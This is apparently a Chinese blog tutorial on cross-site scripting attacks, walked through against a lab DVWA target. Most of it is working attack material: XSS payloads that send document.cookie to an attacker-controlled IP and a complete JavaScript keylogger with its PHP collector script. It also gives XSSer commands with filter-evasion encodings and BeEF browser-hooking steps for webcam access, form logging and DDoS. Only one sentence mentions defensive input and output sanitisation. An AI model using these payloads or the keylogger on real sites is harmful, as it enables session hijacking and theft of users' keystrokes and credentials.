---
title: XSS常用攻击手段
date: 2018-01-31 14:48:21
categories: 安全
tags: 漏洞
---
XSS（cross-site scripting）
------
>通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的
注入客户端脚本代码，盗取cookie、重定向
>

__使用场景__
```
直接嵌入html：<script> alert('xss);</script>
元素标签时间：<body onload=alert('xss')>
图片标签：<img src="javascript:alert('xss);">
其他标签：<iframe>，<div>，<link>
DOM对象，篡改页面内容
```
__漏洞形成的根源：__
+ 服务器对用户提交数据过滤不严
+ 提交给服务器的脚本被直接返回给其他客户端执行
+ 脚本在客户端执行恶意操作

__XSS漏洞类型：__
+ 存储型（持久型）
+ 反射型（非持久）
+ DOM 型

__怎么知道网站是否有漏洞：__
提交的数据原封不动的返回  

![提交表单前](http://upload-images.jianshu.io/upload_images/5834506-371c5fff4a97bb4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![提交表单后](http://upload-images.jianshu.io/upload_images/5834506-4e42465a9340d6bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
__反射型漏洞注入：__
---
```
<script>alert('xss');</script>
<a href='' onlick=alert('xss');></a>
<img src=http://192.168.1.1/a.jpg onerror=alert('xss');</script>（当图片找不到就会执行onerror）
<script>window.location='http://192.168.1.1'</script>（页面重定向）
<iframe src="http://192.168.1.1/victim" height="0" width="0"></iframe>
<script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie;</iframe>
（将cookie发送到自己的主机）
<script>document.body.innerHTML="<div style=visibility:visible;><h1>HELLO</h1></div>;"</script>
<script src="http://1.1.1.1/a.js"></script>
a.js: var img = new Image();img.src="http://1.1.1.1/cookie.php?cookie="+document.cookie
（让浏览器去包含一个有木马的js文件，这样有隐蔽性）
```
__反射型漏洞例子：键盘记录器__
原理：在被攻击者的电脑浏览器上调用指定ip地址上的js文件，即利用XSS输入以下脚本
`<script src="http://1.1.1.1/keylogger.js"></script>`  

在`/var/www/html/`目录下新建`keylogger.js`

keylogger.js
```javascript
document.onkeypress = function(evt) {
  evt = evt || window.event;
  key = String.fromCharCode(evt.charCode)
  if(key) {
    var http = new XMLHttpRequest();
    var param = encodeURI(key);
    http.open("POST","http://1.1.1.1/keylogger.php",true);//注意：把ip地址改成自己的ip
    http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    http.send("key="+param);  
  } 
}
```
由于我们是由`keylogger.php`文件接收键盘记录的，所以还需要一个php脚本

keylogger.php
```php
<?php
    $key = $_POST['key'];
    $logfile = "keylog.txt";
    $fp = fopen($logfile,"a");
    fwrite($fp,$key);
    fclose($fp);
?>
```
然后新建一个`keylog.txt`，用来记录被攻击者的键盘记录，改写它的权限`chmod 777 keylog.txt`
然后执行`service apache2 start`开启apache，可以用`netstat -pantu | grep :80`查看被占用的进程然后杀掉
确保能够访问到刚才写的js脚本  

![](http://upload-images.jianshu.io/upload_images/5834506-0df4a67ed2e19f9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

最后就可以在有XSS漏洞的地方输入`<script src="http://1.1.1.1/keylogger.js"></script>`注入脚本  

![](http://upload-images.jianshu.io/upload_images/5834506-974e501753a737bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  
提交之后，可以看到url地址已经变了，而且被攻击者也有提示输入成功，这个时候我们就可以敲键盘，没有焦点也可以记录键盘，这里为了显示方便，我们在输入框输入`hello hacker`  

![被攻击者用键盘输入](http://upload-images.jianshu.io/upload_images/5834506-c61c42f5e0acc2e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

![攻击者的keylog文件](http://upload-images.jianshu.io/upload_images/5834506-407ea68464fc3a9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

Xsser--自动化工具
----
+ 图形化/命令行界面（图形化只需要在命令行输入`xsser --gtk`）
+ 绕过服务器端输入筛选
10进制/16进制
unescape()
+ xsser -u "http://172.16.242.128/dvwa/vulnerabilities/" -g "xss_r/?name=" --cookie="security=low; PHPSESSID=1f7c245b5c6145fbeb0f36d5e601ef2f" -s -v --reverse-check

参数
```
-g（Get方法） -p （Post方法）
-s （在结束后显示统计信息）
-v （显示详细信息）
--reverse-check （发送一个含有本机连接的js文件，基于连接是否被建立来判断时候有漏洞）
--heuristic （检查被过滤的字符）
```
对payload编码，绕过服务器端筛选过滤
```
    --Str               Use method String.FromCharCode()
    --Une               Use Unescape() function
    --Mix               Mix String.FromCharCode() and Unescape()
    --Dec               Use Decimal encoding
    --Hex               Use Hexadecimal encoding
    --Hes               Use Hexadecimal encoding with semicolons
    --Dwo               Encode IP addresses with DWORD
    --Doo               Encode IP addresses with Octal
    --Cem=CEM           Set different 'Character Encoding Mutations'
                        (reversing obfuscators) (ex: 'Mix,Une,Str,Hex')
```
注入技术
```
    --Coo               COO - Cross Site Scripting Cookie injection
    --Xsa               XSA - Cross Site Agent Scripting
    --Xsr               XSR - Cross Site Referer Scripting
    --Dcp               DCP - Data Control Protocol injections
    --Dom               DOM - Document Object Model injections
    --Ind               IND - HTTP Response Splitting Induced code
    --Anchor            ANC - Use Anchor Stealth payloader (DOM shadows!)
```
其他可以用的参数
```
    --Fp=FINALPAYLOAD   OWN    - Exploit your own code
    --Fr=FINALREMOTE    REMOTE - Exploit a script -remotely-
    --Doss              DOSs   - XSS (server) Denial of Service
    --Dos               DOS    - XSS (client) Denial of Service
    --B64               B64    - Base64 code encoding in META tag (rfc2397)
    --Onm               ONM - Use onMouseMove() event
    --Ifr               IFR - Use <iframe> source tag
```
存储型XSS
---
+ 长期存储于服务器端
+ 每次用户访问都会被执行js脚本

漏洞常见于有留言板之类功能的网站，因为评论或留言之后我们可以看到自己刚才输入的东西。这样，只要一次注入，其他人打开这个网站的时候，就会加载这个脚本，就可以盗取cookie或者记录键盘
有一些评论会限制字数，不能注入完整的脚本，但是我们可以用`burpsuite`截断代理，截断请求，然后在请求里面注入脚本，关于怎么使用`burpsuite`我在之前有发过一篇工具介绍，可以参考那篇文章

对于XSS，需要对变量输入和变量输出做数据清洗（符号编码，去除一些字符），才能完全补上这个漏洞

DOM型XSS
---
DOM ：一套js和其他语言可以调用的API 
```
<script>var img=document.createElement("img");img.src="http://1.1.1.1:88/log?"+escape(document.cookie);</script>
```
BEEF攻击框架
---
+ 生成、交付payload
+ ruby语言编写
+ 服务器端：管理hooked客户端
+ 客户端：运行于客户端浏览器的 js 脚本（hook）
浏览器攻击面：
+ 应用普遍转移到B/S架构，浏览器成为统一客户端程序
+ 结合社会工程学方法对浏览器进行攻击
+ 攻击浏览器用户
+ 通过注入的JS脚本，利用浏览器攻击其他网站
攻击手段：
+ 利用网站xss漏洞实现攻击，能利用存储型xss漏洞更好
+ 诱使客户端访问含有hook的伪造站点
+ 结合中间人攻击注入hook脚本
常见用途：
+ 键盘记录器
+ 网络扫描
+ 浏览器信息收集
+ 绑定shell
+ 与metasploit 集成
使用方式：
在kali2.0的左侧就有集成好的Beef，点击之后在终端可以看到提示，在浏览器中输入url就能进入到web管理页面，默认帐号和密码都是`beef`  

![](http://upload-images.jianshu.io/upload_images/5834506-971e33a1751fc483.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

在有xss漏洞的地方注入终端提示的代码，注意，要把ip地址改为beef启动的机器的ip地址
![](http://upload-images.jianshu.io/upload_images/5834506-c21b84a808833622.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)   

之后就能在 beef管理页面看到被hooked的网站  

![](http://upload-images.jianshu.io/upload_images/5834506-f59f32a3770ef2c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  
hooked客户端做的一切操作都会记录在`log`标签  
![](http://upload-images.jianshu.io/upload_images/5834506-567e1f0e78f8a2d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
commands标签：
+ 绿色：表示模块适合目标浏览器，并且执行结果不被客户端可见
+ 红色：表示模块不适用于当前用户，有些红色模块也可以正常执行
+ 橙色：模块可用，但结果对用户可见（CAM弹窗申请权限等）
+ 灰色：模块未在目标浏览器上测试过

这个标签包含很多模块，可以对hooked客户端进行各种攻击，包括打开摄像头，记录表单，甚至可以利用hooked的浏览器进行DDOS攻击，就是所谓的僵尸机，有很强的隐蔽性



